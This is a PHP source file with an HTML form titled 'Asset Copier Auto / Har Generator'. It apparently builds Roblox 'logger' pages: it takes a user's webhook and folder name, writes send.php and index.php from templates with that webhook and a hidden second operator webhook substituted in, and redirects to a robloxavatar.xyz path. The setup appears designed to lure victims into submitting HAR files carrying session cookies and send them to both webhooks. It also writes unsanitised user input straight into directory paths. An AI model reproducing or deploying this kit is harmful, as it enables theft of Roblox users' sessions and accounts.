<?php
$dir2 = "{folderhere}";
$thook = "{trhook}";
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $dir = $_POST['folder'];
    if(!is_dir($dir)){
        mkdir($dir);
    } else {
    	die('Please don\'t try overwriting others\' loggers!');
    }
        fwrite(fopen($dir.'/send.php', "w"), str_replace("{whook}", $_POST['webhook2'],str_replace("{whook1}", $thook, str_replace("{folder}", $dir2, str_replace("{folder1}", $_POST['folder'], file_get_contents("send.php"))))));
        fwrite(fopen($dir.'/index.php', "w"), str_replace("{folder1}", $_POST['folder'], str_replace("{folder}", $dir2, file_get_contents("index1.php"))));
        header("location: https://robloxavatar.xyz/$dir2/$dir");
    }
?> 
<style>
    html {
  scroll-behavior: smooth;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  background: #121212; /* fallback for old browsers */
  overflow-x: hidden;

  height: 100%;

  /* code to make all text unselectable */
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  -o-user-select: none;
  user-select: none;
}

/* Disables selector ring */
body:not(.user-is-tabbing) button:focus,
body:not(.user-is-tabbing) input:focus,
body:not(.user-is-tabbing) select:focus,
body:not(.user-is-tabbing) textarea:focus {
  outline: none;
}

/* ########################################################## */

h1 {
  color: white;

  font-size: 35px;
  font-weight: 800;
}

.flex-container {
  width: 100vw;

  margin-top: 60px;

  display: flex;
  justify-content: center;
  align-items: center;
}

.content-container {
  width: 500px;
  height: 350px;
}

.form-container {
  display: flex;
  justify-content: center;
  align-items: center;

  width: 500px;
  height: 350px;

  margin-top: 5px;
  padding-top: 20px;

  border-radius: 12px;

  display: flex;
  justify-content: center;
  flex-direction: column;

  background: #1f1f1f;
  box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.199);
}

.subtitle {
  font-size: 11px;

  color: rgba(177, 177, 177, 0.3);
}

input {
  border: none;
  border-bottom: solid rgb(143, 143, 143) 1px;

  margin-bottom: 30px;

  background: none;
  color: rgba(255, 255, 255, 0.555);

  height: 35px;
  width: 300px;
}

.submit-btn {
  cursor: pointer;

  border: none;
  border-radius: 8px;

  box-shadow: 2px 2px 7px #38d39f70;

  background: #38d39f;
  color: rgba(255, 255, 255, 0.8);

  width: 300px;

  transition: all 1s;
}

.submit-btn:hover {
  color: rgb(255, 255, 255);

  box-shadow: none;
}

</style>
<div class="flex-container">
    <div class="content-container">
      <div class="form-container">
        <form method="POST" action="index.php">
          <h1>
           Asset Copier Auto
           <br> <center>    Har Generator </center>
          </h1>
          <br>
          <span class="subtitle">Webhook:</span>
          <br>
          <input type="password" name="webhook2" value="">
          <br>
          <span class="subtitle">Directory Name:</span>
          <br>
          <input type="text" name="folder" value="">
          <br><br>
 <input type="submit" value="SUBMIT" class="submit-btn">
        </form>
      </div>
    </div>
  </div>